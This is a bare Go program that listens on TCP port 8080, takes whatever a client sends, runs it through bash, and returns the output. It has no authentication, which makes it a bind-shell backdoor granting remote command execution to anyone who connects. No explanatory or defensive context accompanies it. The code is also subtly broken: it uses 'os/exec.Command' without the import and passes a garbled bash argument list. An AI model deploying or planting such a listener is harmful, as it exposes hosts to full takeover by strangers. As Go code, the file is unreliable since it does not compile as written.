package main

import (
    "fmt"
    "net"
    "os"
)

func main() {
    listener, err := net.Listen("tcp", ":8080")
    if err != nil {
        fmt.Println(err)
        return
    }
    defer listener.Close()

    for {
        conn, err := listener.Accept()
        if err != nil {
            fmt.Println(err)
            continue
        }

        go handleConnection(conn)
    }
}

func handleConnection(conn net.Conn) {
    buffer := make([]byte, 2048)
    n, err := conn.Read(buffer)
    if err != nil {
        fmt.Println(err)
        return
    }

    cmd := string(buffer[:n])
    output, err := os/exec.Command("bash", "/bin/bash", "-c", cmd).Output()
    if err != nil {
        conn.Write([]byte(err.Error()))
        return
    }

    conn.Write(output)
}

